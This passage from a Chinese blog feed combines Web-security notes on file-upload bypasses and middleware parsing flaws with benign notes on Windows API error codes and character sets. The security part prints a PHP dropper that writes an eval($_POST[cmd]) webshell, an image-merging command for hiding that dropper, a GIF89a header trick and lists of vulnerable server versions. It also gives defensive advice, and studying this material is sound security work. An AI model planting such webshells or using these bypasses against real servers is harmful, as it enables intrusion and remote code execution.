class="string">&quot;gif&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;49492A00&quot;</span>，<span class="string">&quot;tif&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;424D&quot;</span>, <span class="string">&quot;bmp&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;41433130&quot;</span>，<span class="string">&quot;dwg&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;38425053&quot;</span>, <span class="string">&quot;psd&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;7B5C727466&quot;</span>, <span class="string">&quot;rtf&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;3C3F786D6C&quot;</span>, <span class="string">&quot;xml&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;68746D6C3E&quot;</span>, <span class="string">&quot;html&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;44656C69766572792D646174&quot;</span>, <span class="string">&quot;eml&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span> (<span class="string">&quot;CFAD12FEC5FD746F&quot;</span>, <span class="string">&quot;dbx&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;2142444E&quot;</span>, <span class="string">&quot;pst&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;DOCF11E0&quot;</span>, <span class="string">&quot;xls/doc&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;5374616E64617264204A&quot;</span>, <span class="string">&quot;mdb&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;FF575043&quot;</span>, <span class="string">&quot;wpd&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;252150532041646F6265&quot;</span>, <span class="string">&quot;eps/ps&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;255044462D312E&quot;</span>, <span class="string">&quot;pdf&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;B3828596&quot;</span>, <span class="string">&quot;pwl&quot;</span>)</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;504B0304&quot;</span>, <span class="string">&quot;zip&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;52617221&quot;</span>, <span class="string">&quot;rar&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;57415645&quot;</span>, <span class="string">&quot;wav&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;41564920&quot;</span>, <span class="string">&quot;avi&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;2E7261FD&quot;</span>, <span class="string">&quot;ram&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;2B524D46&quot;</span>, <span class="string">&quot;rm&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;000001BA&quot;</span>, <span class="string">&quot;mpg&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;000001B3&quot;</span>, <span class="string">&quot;mpg&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;6D6F6F76&quot;</span>, <span class="string">&quot;mov&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;3026B2758E66CF11&quot;</span>, <span class="string">&quot;asf&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;4D546864&quot;</span>, <span class="string">&quot;mid&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFileType</span>(<span class="params"><span class="variable">$fleName</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$file</span> = @fopen( <span class="variable">$fleName</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="variable">$bin</span> = fread(<span class="variable">$fle</span>, <span class="number">5</span>);  <span class="comment">//只读5个字节</span></span><br><span class="line">fclose(<span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$typelist</span>=getTypeList();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$typelist</span> <span class="keyword">as</span> <span class="variable">$v</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="variable">$blen</span>=strlen(pack(<span class="string">&quot;H*&quot;</span>,<span class="variable">$v</span>[<span class="number">0</span>])); <span class="comment">// 得到文件头标记字节数</span></span><br><span class="line">  	<span class="variable">$tbin</span>=substr(<span class="variable">$bin</span>,<span class="number">0</span>,intval(<span class="variable">$blen</span>));<span class="comment">//需要比较文件头长度</span></span><br><span class="line">		<span class="keyword">if</span>(strtolower(<span class="variable">$v</span>[<span class="number">0</span>])==strtolower(array_shift(unpack(<span class="string">&quot;H*&quot;</span>,<span class="variable">$tbin</span>))))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$v</span>[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$upfile</span>=<span class="variable">$_FILES</span>[<span class="string">&quot;upfile&quot;</span>];</span><br><span class="line"><span class="variable">$name</span>=<span class="variable">$upfile</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line"><span class="variable">$type</span>=<span class="variable">$upfile</span>[<span class="string">&quot;type&quot;</span>];</span><br><span class="line"><span class="variable">$size</span>=<span class="variable">$upfile</span>[<span class="string">&quot;size&quot;</span>];</span><br><span class="line"><span class="variable">$tmp_name</span>=<span class="variable">$upfile</span>[<span class="string">&quot;tmp_ name&quot;</span>];</span><br><span class="line">	<span class="variable">$distination</span> = <span class="string">&#x27;/var/www/html/up1oad_04/fle/&#x27;</span>.<span class="variable">$name</span>;</span><br><span class="line">	<span class="keyword">echo</span> checkFileType(<span class="variable">$upfile</span>[<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">move_uploaded_file(<span class="variable">$upfile</span>[<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$distination</span>);</span><br></pre></td></tr></table></figure>

<p>（2）文件加载检测中的图像二次渲染</p>
<p>（3）图像内容检测</p>
<p><strong>绕过方法</strong>：</p>
<div class="note warning"><ol>
<li><p>文件头检测</p>
<p>修改文件头，对前<code>20</code>字节进行替换，后面再插人一句话木马，即可实现对文件内容检测的绕过。使用时先在要上传的文件的所有内容前添加<code>GIF89a</code>，Web 系统可判断当前文件为gif类型。需要注意的是，在实际中仅使用这种方法很多时候不能成功，因为上传功能还检测了后缀名<code>MIME</code>等。因此若仅仅是针对文件内容检测，可采用这种方法进行尝试。</p>
</li>
<li><p>文件二次渲染（极难）</p>
</li>
</ol>
<p>   1）基于数据二义性，即让数据既是图像数据也包含一句话木马。</p>
<p>   2）对文件加载器进行溢出攻击。</p>
<p>这里需要注意的是，如果仅仅对<code>.php</code>文件添加上述文件头，并不一定会控制<code>MIME</code>的生成值。因为在不同浏览器下，针对文件生成<code>MIME</code>时会有不同的情况。<code>IE</code>浏览器默认会根据文件头确定<code>MIME</code>值。但是<code>Chrome</code>、<code>Firefox </code>则仍以后缀名方式进行判断。</p>
</div>

<h4 id="1-3-5-上传流程安全防护总结"><a href="#1-3-5-上传流程安全防护总结" class="headerlink" title="1.3.5 上传流程安全防护总结"></a>1.3.5 上传流程安全防护总结</h4><p>攻击者利用上传功能实现的主要目标是：</p>
<ul>
<li>上传木马</li>
<li>让木马按照Web格式进行解析</li>
</ul>
<p>因此，在防护手段上，系统设计者在设计之初，考虑到系统性能问题，无法对每个上传的内容进行检查。这是因为多数上传的文件内容过于庞大，如果贸然对文件内容进行完全检查，则要消耗大量的系统资源，同时对系统速度造成极大影响，导致用户体验下降。因此有效的防护手段就是避免木马按照既定格式进行上传。可用的思路有：</p>
<p>（1）限制高危扩展名上传</p>
<ul>
<li>利用黑白名单确定后缀名是否合法。</li>
<li>根据应用特点重新对上传文件进行后缀重命名。</li>
</ul>
<p>（2）限制高危文件内容出现</p>
<ul>
<li>利用内容检索来检测是否存在非正常内容。</li>
<li>确认图片格式与上传文件内容是否对应。</li>
<li>在图像加载时重新渲染，避免非图像内容出现。</li>
</ul>
<p>不同于<code>XSS</code>攻击与<code>SQL</code>注入攻击，在上传过程中，在每个步骤上均可开展防护，根本目标是避免木马在服务器端执行，这也就是上传攻击的防护初衷。</p>
<h3 id="1-4-文件解析漏洞"><a href="#1-4-文件解析漏洞" class="headerlink" title="1.4 文件解析漏洞"></a>1.4 文件解析漏洞</h3><p>解析漏洞可以说是 Web 安全中比较“古老”的漏洞类型，绝大多数解析漏洞都是由于中间件的版本过低造成的。由于中间件在判断文件类型时，存在判断机制的问题，导致在实际解析过程中并不会按照既定的后缀名进行解析。攻击者针对这种情况，在文件名构造上进行特殊设计，导致中间件在判断此类特殊文件名时触发解析漏洞，实际解析后的文件 与文件名并不相同（<code>.jpg</code>文件会被当作<code>.php</code>文件执行）。解析漏洞的危害在于 Web 应用防护方面防护看似非常到位，但仍存在安全隐患。目前主流中间件在老版本中均在解析漏洞。以下为常见的存在解析漏洞的中间件及对应特性。</p>
<p>低版本的中间件存在解析漏洞。 下图是上传安全防护流程图。　</p>
<p><img data-src="https://i.loli.net/2020/12/21/2aWJsHwnoZUCrhT.png" alt="上传安全防护流程图"></p>
<h4 id="1-4-1-htaccess-攻击"><a href="#1-4-1-htaccess-攻击" class="headerlink" title="1.4.1 .htaccess 攻击"></a>1.4.1 .htaccess 攻击</h4><p>Apache 中允许多站点同时解析，关于Apache 的虚拟主机、虚拟目录、多站点：</p>
<p><strong>多站点</strong>：访问主机服务的本质访问 Web 服务，本质上看（从协议上）是访问某个 IP 的主机上的某个端口（默认是80），通常需要通过访问不同的域名或者端口，实现对不同网站的访问(具体到服务器里就是不同目录)，这个时候就需要设置网站空间。通常分为3种：<strong>基于域名、基于端口、基于IP以及它们的混合</strong>。</p>
<p>Apache 的虚拟主机就是在一台服务器上运行多个网站，每个虚拟主机都可以绑定独立的域名，为这些域名可以指定单独的目录，访问这些域名的时候，Apache 会打开对应目录里面的东西。实际是<mark class="label warning">依靠域名访问不同的目录文件</mark>。</p>
<p><strong>目录别名（虚拟目录</strong>）： 某个站点<code>www.abc.com</code>所对应文件夹下有一个目录为<code>d1</code>，则可以这样访问该目录： <code>www.abc.com/d1</code> 这个<code>d1</code>就称为“<strong>真实目录</strong>”； 虚拟目录就是： 该站点下不存在某目录名，但却可以使用同样的语法形式，去访问，比如：<code> www.abc.com/d2</code>  ，假设该站点目录下根本就没有<code>d2</code>这个目录，此时却可以访问实现这种技术，就是所谓“目录别名”（<strong>虚拟目录</strong>）</p>
<p><a href="http://httpd.apache.org/docs/2.4/zh-cn/vhosts/">Apache 虚拟主机文档</a>、<a href="https://blog.csdn.net/the_victory/article/details/51006167?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.control">Apache2.4虚拟主机和多站点配置</a>、<a href="https://blog.csdn.net/qq_37730771/article/details/79729931">单站点和多站点和虚拟目录</a>、<a href="https://www.cnblogs.com/hzk001/p/11748204.html">Apache的虚拟主机功能</a></p>
<div class="note danger"><p><strong>虚拟主机</strong>：Apache的虚拟主机功能 (Virtual Host) 是可以让一台服务器基于IP、主机名或端口号实现提供多个网站服务的技术。简单来说，Apache 虚拟主机就是在一个 Apache 服务器上配置多个虚拟空间，实现一个服务器提供多站点服务，其实就是访问同一个服务器上的不同目录。每个目录对应一个站点。</p>
</div>

<p><code>.htaccess</code>文件是 Apache 服务器中最常用的一个配置文件，它负责相关目录下的网页配置。通过 <code>.htaccess</code>文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置索引入口等功能。</p>
<p>在早期以黑白名单为主流防护技术的时期，攻击者经常在获得当前系统的 Webshell 之后，会修改<code>.htaccess</code>文件内容，添加未知后缀以<code>.php</code>的方式执行（任意后缀的文件都会被当作 php 文件执行）。这样就算当前的 Webshell 丢失，也可在下次攻击时直接利用未知文件名重新快速获得 Webshell，这也算另一种“后门”的效果。</p>
<p>虽然用户端做了大量的防护功能，但是可利用虚拟目录功能，实现中间件层的解析欺骗，导致木马可以非正常后缀名进行执行。不过，实际过程中可利用的场景非常少，主要是由于<mark class="label info">.htaccess 文件需放在当前 Web 目录下面</mark>。攻击者如果能在当前Web目录下插人任意的文件，其实攻击者已经获得当前系统的webshell，也就没有必要利用这种方式进行攻击。</p>
<p>【<a href="https://blog.csdn.net/jamin25521/article/details/7883019">htaccess功能</a>】</p>
<h4 id="1-4-2-Apache-解析漏洞攻击"><a href="#1-4-2-Apache-解析漏洞攻击" class="headerlink" title="1.4.2 Apache 解析漏洞攻击"></a>1.4.2 Apache 解析漏洞攻击</h4><p>Apache中间件早期版本在后缀解析<code>test.php.x1.x2.x3</code>时，Apache 将<mark class="label primary">从右至左</mark>开始判断后缀，若<code>x3</code>为非可识别后缀，再判断<code>x2</code>，直到找到可识别后缀为止，然后将该可识别后缀进解析。例如，<code>test.php.x1.x2.x3</code>会被解析为<code>php</code>。</p>
<p>解析漏洞的危害在于对以上的文件上传防护机制都可以进行绕过。当然，存在解析漏洞的中间件的版本都比较老，新版本不存在上述问题。因此要解决解析漏洞的问题，简单有效的方法就是升级中间件版本。</p>
<p>另外有一点需要注意， 很多人会使用集成环境来部署 Web 服务器。集成环境部署简易、使用方便，因此应用广泛。但需要注意的是，集成环境的软件版本并不是中间件的版本。因此从安全角度考虑，需要严格检查集成环境中的 Apache及 PHP 版本，避免出现解析漏洞或截断漏洞等。下面是些存在解析漏洞的集成环境版本及中间件对应版本信息，用以核对当前服务器安全状态或进行漏洞测试：</p>
<ul>
<li>WampServer2.0 All Version (WampServer2.0i &#x2F; Apache 2.2.11)</li>
<li>WampServer2. 1 All Version (WampServer2. le-x32 &#x2F; Apache 2.2.17)</li>
<li>Wamp5 All Version (Wamp5_ 1.7.4 &#x2F; Apache 2.2.6)</li>
<li>AppServ 2.4 All Version (AppServ - 2.4.9 &#x2F; Apache 2.0.59)</li>
<li>AppServ 2.5 All Version (AppServ - 2.5.10 &#x2F; Apache 2.2.8)</li>
<li>AppServ 2.6 AlI Version (AppServ - 2.6.0 &#x2F; Apache 2.2.8)</li>
</ul>
<h4 id="1-4-3-IIS-解析漏洞攻击"><a href="#1-4-3-IIS-解析漏洞攻击" class="headerlink" title="1.4.3 IIS 解析漏洞攻击"></a>1.4.3 IIS 解析漏洞攻击</h4><div class="note default"><p><strong>（1） IIS 6.0</strong></p>
<p>随着 Windows Server 2003 的停止维护，IIS 6.0 的利用范围也在大幅度缩小。目前，新版的 IIS 中已不存在解析漏洞。这里仅以6.0环境作为漏洞利用场景来分析解析漏洞的综合利用方式。在解析<code>asp</code>格式的时候有两个解析漏洞：</p>
<p>1）如果<mark class="label danger">目录</mark>名包含<code>.asp</code>字符串，那么这个目录下所有的文件都会按照<code>asp</code>格式解析。例如，对于<code>/xx.asp/xx.jpg</code> （ <code>xx.jpg</code>可替换为任意文本文件），IIS 6.0 会将<code>xx.jpg</code>解析为<code>asp</code>文件。</p>
<p>2）只要文件名中含有<code> .asp;</code>，就会优先按<code>asp</code>来解析。例如，对于<code>/xx.asp;jpg</code> （此处需抓包修改文件名），IIS 6.0 都会把此类后缀文件成功解析为<code>asp</code>文件。（<code>/xx.asp:.jpg</code>这 类文件在Windows下不允许存在，<code>:.jpg </code>被自动除去，剩下<code>/xx.asp</code>。）    </p>
<p>HIS 6.0 默认的可执行文件除了<code>asp</code>还包含如下三种：<code> /xx.asa</code>、<code> /xx.cer</code>、<code>/xx.cdx</code>。（在 IIS默认配置中，这几个后缀默认由<code>asp.dll</code>来解析，所以执行权限和<code>.asp</code>一模一样，可在配置中自行删除该后缀，以免出现安全隐患。）</p>
</div>

<div class="note primary"><p><strong>（2）IIS 7.0&#x2F;IIS 7.5</strong></p>
<p>IIS 7.0&#x2F;7.5 存在的解析漏洞利用场景比 IIS 6.0要苛刻，主要是在对<code>php</code>解析时存在类似于 Nginx 的解析漏洞，并且需要处于<code>Fast-CGI</code>开启状态。在漏洞利用方式上，只要在任意文件名的 URL 后追加字符串<code>/任意文件名.php</code>，那么当前文件就会按照<code>php</code>的方式解析。</p>
<p>利用方法如下：将一张图和一个写人后门代码的文本文件合并， 将恶意文本写人图片的二进制代码之后，避免破坏图片文件头和尾。Windows 下可利用 CMD 命令实现文件拼接:：<code>copy xx.jpg/b + yy.txt/a xy.jpg</code></p>
<p>其中，参数的意义为：</p>
<ul>
<li><code>/b</code>  二进制（binary）模式。</li>
<li><code>/a</code>   ASCII 模式<code>xx.jpg</code>正常图片文件。</li>
<li><code>yy.txt</code>的内容如下：</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span> fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval($_POST[cmd])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这段代码的作用是写人一个内容为<code>&lt;?php eval($_POST[cmd])?&gt; </code>、名称为<code>shell.php</code>的文件。利用图片合成工具，也可达到上述效果。</p>
<p>执行成功后的效果就是在上传文件的真实目录下生成一句话木马文件<code>shel.php</code>，再利用各类连接工具连接即可完成整体漏洞利用。需要注意的是，<strong>IIS7.0&#x2F;7.5 下的解析漏洞是由于<code>php-cgi</code>本身的问题导致，与 IIS 自身并没有直接关系</strong>。</p>
</div>

<h4 id="1-4-4-Nginx-解析漏洞攻击"><a href="#1-4-4-Nginx-解析漏洞攻击" class="headerlink" title="1.4.4 Nginx 解析漏洞攻击"></a>1.4.4 Nginx 解析漏洞攻击</h4><p>目前 Nginx 的解析漏洞利用方式与 Apache、IIS基本一致。一个是对于任意文件名，在后面添加<code>/任意文件名.php</code>的解析漏洞，比如原本文件名是<code>test.jpg</code>，可以添加为<code>test.jpg/x.php</code>进行解析攻击。还有一种是针对低版本的 Nginx，可以在任意文件名后面添加<code>%00.php</code>进行解析攻击。</p>
<p>下面几个版本都存在此问题：</p>
<ul>
<li>Nginx 0.5.*</li>
<li>Nginx 0.6.*</li>
<li>Nginx 0.7 &lt;&#x3D; 0.7.65</li>
<li>Nginx 0.8 &lt;&#x3D; 0.8.37</li>
</ul>
<p><code>任意文件名/任意文件名.php</code>这个漏洞其实是出现自<code>php-cgi</code>的漏洞，与 Nginx 自身无关，这点与 IIS 7.0&#x2F;7.5 与 PHP 配合使用时解析漏洞产生原理一样。</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>知识笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows核心编程（第五版）_1_错误处理_字符处理_内核对象</title>
    <url>/post/windows-core-programming/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ  ɔ: </p>
<span id="more"></span>

<p><img data-src="https://img.shields.io/badge/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E3%80%8AWindows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B%EF%BC%88%E7%AC%AC%E4%BA%94%E7%89%88%EF%BC%89%E3%80%8B-1fd0f6.svg?colorA=ff69b4"></p>
<h2 id="1-Windows-API返回值"><a href="#1-Windows-API返回值" class="headerlink" title="1 Windows API返回值"></a>1 Windows API返回值</h2><p>调用Windows函数时，它会先验证我们传给它的参数，然后再开始执行任务。如果传入的参数无效，或者由于其他原因导致操作无法执行，则函数的返回值将指出函数因为某些原因失败了。表1-1展示了大多数Windows函数使用的返回值的数据类型。</p>
<p><img data-src="https://i.loli.net/2021/11/04/5kmzEPThDyJ43bO.png" alt="1.png"></p>
<h3 id="1-1-函数的错误码"><a href="#1-1-函数的错误码" class="headerlink" title="1.1 函数的错误码"></a>1.1 函数的错误码</h3><p>通常情况下，如果 Windows函数能返回错误代码，将有助于我们理解函数调用为什么会失败。 Microsoft编辑了一个列表，其中列出了所有可能的错误代码，<mark class="label success">并为每个错误代码都分配了一个32位的编号</mark>。定义于<mark class="label danger">WinError.h</mark>头文件中。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">GetlastError</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>

<p>此函数的作用很简单，就是返回由上一个函数调用设置的线程的32位错误代码。</p>
<p>在这个头文件中每个错误码（消息ID）都对应：一个消息ID（一个可在源代码中使用的宏，用于与<code>GetLastError</code>的返回值进行比较）、消息文本（描述错误的英文文本）和一个编号（应该避免使用此编号，尽量使用消息ID）。</p>
<div class="note primary"><p><strong>注意：</strong>Windows函数失败之后，应该马上调用<code>GetLastError</code>，因为假如又调用了另一个Windows函数，则此值很可能被改写。注意，成功调用的Windows函数可能用<code>ERROR_SUCCESS</code>改写此值。</p>
<p><mark class="label default">不管成功与否，使用<code>GetLastError</code>都可以知道函数调用的额外信息。</mark></p>
</div>

<h3 id="1-2-自定义错误码"><a href="#1-2-自定义错误码" class="headerlink" title="1.2 自定义错误码"></a>1.2 自定义错误码</h3><p>为了指出错误，只需<mark class="label warning">设置线程的上一个错误代码</mark>，然后令自己的函数返回<code>FALSE</code>，<code>INVALID_HANDLE_VALUE</code>、<code>NULL</code>或者其他合适的值。为了设置线程的上一个错误代码，只需调用以下函数，并传递我们认为合适的任何32位值：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">SetlastError</span><span class="params">(DWORD dwErrCode)</span></span>;</span><br></pre></td></tr></table></figure>

<p>该32位值的每一位含义如下：</p>
<p><img data-src="https://i.loli.net/2021/11/04/PMXndw8cJgW5673.png" alt="2.png"></p>
<p>Microsoft承诺，<strong>在它所生成的所有错误代码中，第29位将始终为0</strong>。但是，如果要创建我们自己的错误代码，就必须在此位放入一个1。通过这种方式，可以保证我们的错误代码绝不会与Microsoft现在和将来定义的错误代码冲突。注意，Facility字段非常大，足以容纳4096个可能的值。其中，前256个值是为Microsoft保留的，其余的值可由我们自己的应用程序来定义。</p>
<h2 id="2-字符和字符串处理"><a href="#2-字符和字符串处理" class="headerlink" title="2 字符和字符串处理"></a>2 字符和字符串处理</h2><h3 id="2-1-字符集"><a href="#2-1-字符集" class="headerlink" title="2.1 字符集"></a>2.1 字符集</h3><table>
<thead>
<tr>
<th>字符集</th>
<th>字节数</th>
<th>表示范围</th>
<th>注释</th>
</tr>
</thead>
<tbody><tr>
<td>标准ASCII</td>
<td><strong>1字节</strong>，使用低7位，最高位始终为0.</td>
<td>0～127</td>
<td>标准 ASCII 码使用 7 位二进制数来表示所有的大写和小写字母，数字 0 到 9、标点符号，以及在美式英语中使用的特殊控制字符。</td>
</tr>
<tr>
<td>扩展 ASCII 码（ANSI）</td>
<td><strong>1字节</strong>，使用8位，最高位为0时相当于标准ASCII.</td>
<td>0～255</td>
<td>扩展 ASCII 码允许将每个字符的第 8 位用于确定附加的 128 个特殊符号字符、外来语字母和图形符号。<br />ASCll码的字符集可以扩充了128个字符，即十进制数128～255，称为扩展ASCII码。扩展ASCII码所增加的字符包括加框文字、圆圈和其他图形符号。</td>
</tr>
<tr>
<td>GB2312</td>
<td><strong>2字节</strong>，高9位为0时，低7位含义同标准ASCII.</td>
<td>0～65535</td>
<td>一个小于127的字符的意义与原来相同，  但两个大于127的字符连在一起时，就表示一个汉字。不同的文字（国家语言）存于不同的序段。<br />虽然是双字节编码，但是编码完全不同于Unicode。</td>
</tr>
<tr>
<td>GBK</td>
<td><strong>2字节</strong>，属于扩展的GB2312.</td>
<td>0～65535</td>
<td>GB2312是简体汉字编码规范，GBK编码能够用来同时表示繁体字和简体字，而GB2312只能表示简体字，GBK是兼容GB2312编码的。</td>
</tr>
<tr>
<td>Unicode</td>
<td><strong>1～4字节</strong>，Windows使用UTF-16编码形式存储字符.</td>
<td>0x000000~0x0010FFFF</td>
<td>Unicode只规定了字符的二进制表示方式，并没有指出这些二进制数据如何在计算机中存储（规则）。并且不同国家的语言使用不同的区域，Unicode 只是字符集，UTF-8、UTF-16、UTF-32 才是真正的字符编码规则，常用的编码规则：<br /><strong>UTF-8：</strong>变长编码方式，使用1～4字节来编码不同字符，存储划算，常用于网络传输。<br /><strong>UTF-16：</strong>定长编码，使用2字节或者4字节。编码效率高，Windows、Java使用。<br /><strong>UTF-32：</strong>定长编码，使用4字节，存储非常不划算，更不用说网络传输了。所以这种实现用得极少。</td>
</tr>
</tbody></table>
<p>参考：</p>
<ul>
<li><a href="https://www.21ic.com/article/898541.html">Unicode、UTF-8、UTF-16，终于懂了</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/51202412">Unicode 编码及 UTF-32, UTF-16 和 UTF-8</a></li>
<li><a href="https://www.cnblogs.com/crazylqy/p/10184291.html">彻底弄懂 Unicode 编码</a></li>
</ul>
<h3 id="2-2-ANSI、Unicode字符、字符串数据类型"><a href="#2-2-ANSI、Unicode字符、字符串数据类型" class="headerlink" title="2.2 ANSI、Unicode字符、字符串数据类型"></a>2.2 ANSI、Unicode字符、字符串数据类型</h3><p>C语言的<code>char</code>使用8位的ANSI字符。</p>
<p><code>wchar_t</code>数据类型使用16位（UTF-16）的Unicode。Microsoft的C&#x2F;C++编译器定义了这个内建的数据类型<code>wchar_t</code>。</p>
<p><strong>Unicode编码的数据类型</strong>：</p>
<ul>
<li>数据类型定义在Windows头文件<mark class="label danger">WinNT.h</mark>中；</li>
<li>使用<code>L&#39;&#39;</code>、<code>L&quot;&quot;</code>来表示字符和字符串，如<code>wchar_t wchar = L&#39;A&#39;;</code>；</li>
<li>使用通用字符数据类型<code>TEXT(&#39;&#39;)</code>和<code>TEXT(&quot;&quot;)</code>会在使用ANSI或Unicode的编译器中自动使用<code>char</code>或<code>wchar</code>数据类型。</li>
</ul>
<p>Windows常用数据类型、API、结构体可查看：<a href="https://docs.microsoft.com/en-us/windows/win32/debug/system-error-codes"><mark class="label primary">MSDN</mark></a><a href="https://doxygen.reactos.org/d7/d69/typedefs_8h.html"><mark class="label default">ReactOS</mark></a><a href="https://www.rpi.edu/dept/cis/software/g77-mingw32/include/"><mark class="label warning">Win32头文件</mark></a><a href="http://yfvb.com/help/win32sdk/"><mark class="label info">Win32API参考手册</mark></a>等。</p>
<h3 id="2-3-Windows中的ANSI和Unicode函数"><a href="#2-3-Windows中的ANSI和Unicode函数" class="headerlink" title="2.3 Windows中的ANSI和Unicode函数"></a>2.3 Windows中的ANSI和Unicode函数</h3><p><strong>一、A版、W版Win32 API</strong></p>
<p>自Windows NT起，Windows的所有版本都完全用Unicode来构建。</p>
<p>调用Windows函数时，<strong>如果向它传入一个ANSI字符串（由单字节字符组成的一个字符串），那么函数首先会把字符串转换为Unicode</strong>，再把结果传给操作系统。如果希望函数返回ANSI字符串，那么操作系统会先把Unicode字符串转换为ANSI字符串，再把结果返回给我们的应用程序。所有这些转换都是在幕后进行的。</p>
<p>如果一个Windows函数的多数列表中有字符串，则该函数通常有两个版本，<mark class="label danger">A</mark>版、<mark class="label danger">W</mark>版。如：</p>
<ul>
<li><code>CreateWindowExA</code>：接受ANSI字符串；</li>
<li><code>CreateWindowExW</code>：接受Unicode字符串。</li>
</ul>
<div class="note primary"><p><strong>备注：</strong>使用时只需要用宏<code>CreateWindowEx</code>即可，因为编译器会自动使用<strong>A</strong>版或<strong>W</strong>版。这些类似的宏在<mark class="label danger">WinUser.h</mark>中定义。</p>
<p>ANSI版本只是分配内存，执行必要的字符串转换，然后调用该函数的Unicode版本与操作系统打交道。</p>
</div>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CreateWindowEx  CreateWindowExW</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CreateWindowEx  CreateWindowExA</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// !UNICODE</span></span></span><br></pre></td></tr></table></figure>



<p><strong>二、尽量使用新函数</strong></p>
<p>Windows API中的一些函数如：</p>
<p><code>WinExec</code>和<code>OpenFile</code>存在的唯一目的就是为了向后兼容16位Windows程序，因为后者只支持ANSI字符串。在开发的新程序中，应避免使用这些函数。应该用<code>CreateProcess</code>和<code>CreateFile</code>函数调用来代替。</p>
<p>在内部，老函数总是会调用新函数。但老函数的最大问题在于，它们不接受Unicode字符串，而且支持的功能一般都要少一些。调用这些函数的时候，必须向其传递ANSI字符串。</p>
<h3 id="2-4-C运行库中的ANSI和Unicode函数"><a href="#2-4-C运行库中的ANSI和Unicode函数" class="headerlink" title="2.4 C运行库中的ANSI和Unicode函数"></a>2.4 C运行库中的ANSI和Unicode函数</h3><p>和Windows函数一样，C运行库提供了一系列函数来处理ANSI字符和字符串，并提供了另一系列函数来处理Unicode字符与字符串。然而，与Windows不同的是，<mark class="label info">ANSI版本的函数是不会把字符串转换为Unicode形式，再从内部调用函数的Unicode版本</mark>。当然，Unicode版本的函数也是“自力更生”的，它们不会在内部调用ANSI版本。</p>
<p>字符（串）处理函数举例（使用时应该包含<mark class="label danger">TChar.h</mark>头文件）：</p>
<p>ANSI：<code>strlen</code></p>
<p>Unicode：<code>wcslen</code></p>
